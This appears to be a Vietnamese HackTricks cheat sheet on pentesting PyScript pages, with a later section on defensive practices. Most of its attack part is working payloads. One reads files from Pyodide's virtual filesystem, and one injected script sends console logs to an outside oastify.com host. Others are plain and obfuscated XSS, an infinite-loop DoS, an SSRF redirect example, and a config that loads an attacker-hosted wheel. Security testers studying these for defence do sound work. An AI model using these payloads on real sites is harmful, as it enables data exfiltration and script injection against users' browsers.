# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Hướng dẫn Pentesting PyScript

PyScript là một framework mới được phát triển để tích hợp Python vào HTML, nhờ đó Python có thể được sử dụng cùng với HTML. Trong cheat sheet này, bạn sẽ tìm hiểu cách sử dụng PyScript cho mục đích penetration testing.

### Trích xuất / Lấy tệp từ hệ thống tệp bộ nhớ ảo Emscripten:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:

```html
<py-script>
  with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
  = fin.read() print(out)
</py-script>
```

Kết quả:

![Hướng dẫn pentesting PyScript - Dumping / truy xuất tệp từ hệ thống tệp bộ nhớ ảo Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Exfiltration dữ liệu OOB từ hệ thống tệp bộ nhớ ảo Emscripten (giám sát console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`Mã CVE: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:

```html
<py-script>
  x = "CyberGuy" if x == "CyberGuy": with
  open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
  print(contents) print('
  <script>
    console.pylog = console.log
    console.logs = []
    console.log = function () {
      console.logs.push(Array.from(arguments))
      console.pylog.apply(console, arguments)
      fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
        method: "POST",
        headers: { "Content-Type": "text/plain;charset=utf-8" },
        body: JSON.stringify({ content: btoa(console.logs) }),
      })
    }
  </script>
  ')
</py-script>
```

Kết quả:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Thông thường)

Mã:

```python
<py-script>
        print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```

Kết quả:

![OOB Data Exfiltration của hệ thống tệp bộ nhớ ảo Emscripten (theo dõi console) - Cross Site Scripting (Thông thường): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Mã:

```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```

Kết quả:

![Cross Site Scripting (Thông thường) - Cross Site Scripting (Python được làm rối): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (Làm rối JavaScript)

Mã:

```html
<py-script>
  prinht(""
  <script>
    var _0x3675bf = _0x5cf5
    function _0x5cf5(_0xced4e9, _0x1ae724) {
      var _0x599cad = _0x599c()
      return (
        (_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
          _0x5cf5d2 = _0x5cf5d2 - 0x94
          var _0x14caa7 = _0x599cad[_0x5cf5d2]
          return _0x14caa7
        }),
        _0x5cf5(_0xced4e9, _0x1ae724)
      )
    }
    ;(function (_0x5ad362, _0x98a567) {
      var _0x459bc5 = _0x5cf5,
        _0x454121 = _0x5ad362()
      while (!![]) {
        try {
          var _0x168170 =
            (-parseInt(_0x459bc5(0x9e)) / 0x1) *
              (parseInt(_0x459bc5(0x95)) / 0x2) +
            (parseInt(_0x459bc5(0x97)) / 0x3) *
              (-parseInt(_0x459bc5(0x9c)) / 0x4) +
            -parseInt(_0x459bc5(0x99)) / 0x5 +
            (-parseInt(_0x459bc5(0x9f)) / 0x6) *
              (parseInt(_0x459bc5(0x9d)) / 0x7) +
            (-parseInt(_0x459bc5(0x9b)) / 0x8) *
              (-parseInt(_0x459bc5(0x9a)) / 0x9) +
            -parseInt(_0x459bc5(0x94)) / 0xa +
            (parseInt(_0x459bc5(0x98)) / 0xb) *
              (parseInt(_0x459bc5(0x96)) / 0xc)
          if (_0x168170 === _0x98a567) break
          else _0x454121["push"](_0x454121["shift"]())
        } catch (_0x5baa73) {
          _0x454121["push"](_0x454121["shift"]())
        }
      }
    })(_0x599c, 0x28895),
      prompt(document[_0x3675bf(0xa0)])
    function _0x599c() {
      var _0x34a15f = [
        "15170376Sgmhnu",
        "589203pPKatg",
        "11BaafMZ",
        "445905MAsUXq",
        "432bhVZQo",
        "14792bfmdlY",
        "4FKyEje",
        "92890jvCozd",
        "36031bizdfX",
        "114QrRNWp",
        "domain",
        "3249220MUVofX",
        "18cpppdr",
      ]
      _0x599c = function () {
        return _0x34a15f
      }
      return _0x599c()
    }
  </script>
  "")
</py-script>
```

Kết quả:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Vòng lặp vô hạn)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Vòng lặp vô hạn)

Code:

```html
<py-script>
  while True:
  print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```

Kết quả:

![Cross Site Scripting (JavaScript Obfuscation) - Tấn công DoS (vòng lặp vô hạn):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Lỗ hổng và kỹ thuật mới (2023-2025)

### Server-Side Request Forgery thông qua redirect không được kiểm soát (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` bỏ qua các tham số request `redirect` và `retries` khi sử dụng với browser transport của Pyodide. Nếu kẻ tấn công có thể kiểm soát URL đích, code có thể đi theo redirect sang domain khác ngay cả khi yêu cầu urllib3 vô hiệu hóa chúng, làm suy yếu các biện pháp phòng vệ SSRF.<sup>[[1]](#references)[[4]](#references)</sup>

```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
    "GET",
    "https://evil.example/302",
    retries=False,
    redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```

Nâng cấp lên `urllib3 >= 2.5.0` cho Node.js, nhưng không dựa vào urllib3 để tắt chuyển hướng trong trình duyệt; thay vào đó, hãy xác thực hoặc đưa các đích đến vào danh sách cho phép trước khi gửi yêu cầu.<sup>[[4]](#references)</sup>

### Tải gói tùy ý & tấn công chuỗi cung ứng

Cấu hình Pyodide của PyScript chấp nhận URL wheel tùy ý trong `packages`; nếu kẻ tấn công có thể sửa đổi hoặc chèn cấu hình đó, một lần import sau đó có thể thực thi Python do kẻ tấn công kiểm soát trong trình duyệt của nạn nhân.<sup>[[5]](#references)[[6]](#references)</sup>

```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```

Pyodide có thể cài đặt các wheel Python thuần từ URL bất kỳ mà không cần bản dựng WebAssembly của package.<sup>[[6]](#references)</sup> Hãy để nhà phát triển kiểm soát cấu hình này, chỉ cho phép chính xác các tên package hoặc URL nằm trong allow-list, và xác minh digest của wheel từ xa trong quá trình build hoặc triển khai.

### Các thay đổi về làm sạch đầu ra (2023+)

* Trong bản triển khai 2022.05.1 được dùng trong các ví dụ cũ, `print()` ghi đầu ra `text/plain` mà không escape HTML, nên dễ bị XSS.<sup>[[8]](#references)</sup>
* Helper `display()` hiện tại **escape HTML theo mặc định** đối với chuỗi thuần; markup thô phải được bọc trong `pyscript.HTML()`.<sup>[[2]](#references)</sup>

```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```

Sử dụng `display()` cho dữ liệu đầu vào không đáng tin cậy và không truyền chuỗi không đáng tin cậy vào `HTML()`.<sup>[[2]](#references)</sup>

---

## Các phương pháp bảo mật tốt nhất

* **Luôn cập nhật các package** – sử dụng `urllib3 >= 2.5.0` trong Node.js và xem xét riêng các giả định về chuyển hướng của trình duyệt.<sup>[[4]](#references)</sup>
* **Giới hạn nguồn package** – chỉ cho phép các tên trên PyPI hoặc URL đáng tin cậy cụ thể, đồng thời xác minh digest của wheel từ xa trong quá trình build hoặc triển khai.<sup>[[5]](#references)[[6]](#references)</sup>
* **Tăng cường Content Security Policy** – không cho phép JavaScript nội tuyến (`script-src 'self' 'sha256-…'`) để các khối `<script>` bị chèn không thể thực thi.
* **Không cho phép các thẻ `<py-script>` / `<script type="py">` do người dùng cung cấp** – làm sạch HTML trên máy chủ trước khi gửi lại cho người dùng khác.
* **Cô lập worker** – nếu không cần truy cập DOM đồng bộ từ worker, hãy bật cờ `sync_main_only` để tránh `SharedArrayBuffer` và các yêu cầu về header CORS liên quan.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Tài liệu Built-ins của PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Nghệ thuật xâu chuỗi lỗ hổng (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Thông báo bảo mật urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Tài liệu cấu hình PyScript – packages và `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Tải package](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Triển khai `pyscript.py` của PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
